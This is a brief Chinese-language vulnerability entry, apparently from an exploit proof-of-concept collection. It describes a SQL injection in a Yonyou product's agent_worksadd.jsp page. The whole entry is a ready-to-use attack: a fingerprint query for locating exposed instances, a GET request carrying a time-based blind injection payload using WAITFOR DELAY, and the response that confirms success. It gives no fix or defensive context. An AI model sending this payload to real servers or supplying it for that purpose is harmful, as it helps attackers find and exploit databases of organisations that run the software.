# 时空用友agent_worksadd存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`product="Crocus"`
- **请求**：`GET /worksheet/agent_worksadd.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **响应特征**：200